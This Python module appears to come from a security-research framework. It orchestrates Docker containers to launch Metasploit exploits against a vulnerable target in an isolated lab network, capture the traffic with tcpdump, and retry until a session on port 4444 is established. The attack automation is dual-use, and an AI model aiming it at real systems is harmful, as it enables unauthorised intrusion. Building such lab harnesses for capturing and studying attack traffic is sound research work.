from __future__ import annotations

import logging
import shlex
import time
from abc import ABC, abstractmethod

import docker
import docker.models.containers
import docker.models.networks
import docker.models.volumes
from rich.console import Console
from utils import prefixed_name, safe_stop_remove

console = Console(stderr=True)

logger = logging.getLogger(__name__)


class BaseRunner(ABC):
    """Abstract base for exploit runners.

    Manages the Docker network, volume, tcpdump capture, and Metasploit
    attack container lifecycle. Subclasses implement target and tcpdump
    setup/cleanup for their specific deployment model.
    """

    def __init__(self, docker_client: docker.DockerClient, network_name: str = "set_framework_net",
                 volume_name: str = "set_logs", target_name: str = "target",
                 msf_image: str = "metasploitframework/metasploit-framework:6.2.33",
                 prefix: str = "") -> None:
        """Initialize the runner with Docker client and shared resource names."""
        self.client=docker_client
        self.network=network_name
        self.volume=volume_name
        self.msf_image=msf_image
        self.prefix=prefix
        self.target_name=target_name
        self.exploit_success_pattern="4444"
        self.target_logs=None

    def _prefixed(self, name: str) -> str:
        """Return the session-prefixed version of a container name."""
        return prefixed_name(self.prefix, name)

    def network_setup(self) -> docker.models.networks.Network:
        """Get or create the Docker bridge network for this session."""
        net = None
        networks = [i.name for i in self.client.networks.list()]
        if self.network in networks:
            net = self.client.networks.get(self.network)
        else:
            net = self.client.networks.create(self.network, driver="bridge")
        return net

    def volume_setup(self) -> docker.models.volumes.Volume:
        """Get or create the Docker volume for storing SETC logs."""
        vol = None
        vols = [i.name for i in self.client.volumes.list()]
        if self.volume in vols:
            vol = self.client.volumes.get(self.volume)
        else:
            vol = self.client.volumes.create(name=self.volume)
        return vol

    @abstractmethod
    def target_setup(self) -> None:
        """Start the vulnerable target container(s)."""

    @abstractmethod
    def target_cleanup(self) -> None:
        """Stop and remove the target container(s)."""

    def _run_tcpdump_container(self, pcap_name: str, attach_to: str) -> docker.models.containers.Container:
        """Launch a tcpdump container attached to another container's network namespace.

        Args:
            pcap_name: CVE/vuln name used for the pcap file path.
            attach_to: Name of the container whose network to capture.
        """
        cmd = ["-U", "-v", "-w", f"/data/{pcap_name}/pcap/{pcap_name}.pcap"]
        return self.client.containers.run(
            "tcpdump", command=cmd, detach=True,
            name="%s-tcpdump" % attach_to, privileged=True,
            network="container:%s" % attach_to,
            volumes={self.volume: {"bind": "/data", "mode": "rw"}})

    @abstractmethod
    def tcpdump_setup(self) -> None:
        """Start tcpdump capture for the target."""

    @abstractmethod
    def tcpdump_cleanup(self) -> None:
        """Stop and remove tcpdump container(s)."""

    def attack_setup(self) -> None:
        """Start the Metasploit attack container on the shared network."""
        logger.debug("Starting attack system for %s", self.target_name)
        dk_attack = self.client.containers.run(self.msf_image,
                                 detach=True, name="%s-attack" % self.target_name,
                                 network=self.network, tty=True)
        self.attack=dk_attack

    def attack_cleanup(self) -> None:
        """Stop and remove the Metasploit attack container."""
        safe_stop_remove(self.attack, label="%s-attack" % self.target_name)

    def setup_all(self) -> None:
        """Set up network, volume, target, tcpdump, and attack containers."""
        self.network_setup()
        self.volume_setup()
        self.target_setup()
        self.tcpdump_setup()
        self.attack_setup()

    def cleanup_all(self) -> None:
        """Tear down target and attack containers."""
        self.target_cleanup()
        self.attack_cleanup()

    def exploit(self) -> None:
        """Execute the configured Metasploit exploit against the target."""
        cmd = "/usr/src/metasploit-framework/msfconsole"
        flag = "-x"
        args = """use %s; %s \
            set RHOSTS %s; \
            set LHOST %s; \
            set ForceExploit true; \
            set AutoCheck false; \
            set ExitOnSession false; \
            exploit"""
        logger.debug("Running exploit for %s", self.target_name)
        args = args % (self.msf_exploit, self.msf_options, self.target_name, "%s-attack" % self.target_name)
        result = self.attack.exec_run(cmd=[cmd, flag, args], tty=True, detach=True)

    def exploit_success(self, pattern: str = "4444") -> bool:
        """Check if the exploit established a connection matching the given port pattern."""
        cmd = ["sh", "-c", f"netstat | grep {shlex.quote(str(pattern))} | grep ESTABLISHED"]
        try:
            result = self.attack.exec_run(cmd=cmd, tty=True)
        except (docker.errors.NotFound, docker.errors.APIError) as e:
            logger.warning("Could not check exploit status: %s", e)
            return False
        cmd_result = str(result.output)
        for line in cmd_result.splitlines():
            if pattern in str(line) and "ESTABLISHED" in str(line):
                return True
        return False

    def exploit_until_success(self, status_delay: int = 3, status_checks: int = 7, tries: int = 4) -> bool:
        """Repeatedly run the exploit until an ESTABLISHED connection is detected.

        Args:
            status_delay: Seconds between connection checks.
            status_checks: Number of checks per exploit attempt.
            tries: Maximum number of exploit attempts.
        """
        success = False
        with console.status(f"Exploiting {self.target_name}..."):
            for i in range(tries):
                self.exploit()
                for j in range (status_checks):
                    if self.exploit_success(pattern=self.exploit_success_pattern):
                        success = True
                        break
                    time.sleep(status_delay)
                if success:
                    break
        if success:
            logger.info("Exploit of %s success", self.target_name)
        else:
            logger.warning("Exploit failed or status unknown")
        return success

    @abstractmethod
    def _get_target_container(self) -> docker.models.containers.Container:
        """Return the Docker container object for the vulnerable target."""

    def ready_to_exploit(self, ready_delay: int = 5) -> bool:
        """Return True when the target's log output has stabilized (container is ready)."""
        if self.target_logs == None:
            logger.debug("Checking if target %s is setup", self.target_name)
        try:
            target = self._get_target_container()
            logs = target.logs()
        except (docker.errors.NotFound, docker.errors.APIError) as e:
            logger.warning("Could not get target logs: %s", e)
            return False
        if self.target_logs == logs:
            return True
        else:
            self.target_logs = logs
            time.sleep(ready_delay)
        return False
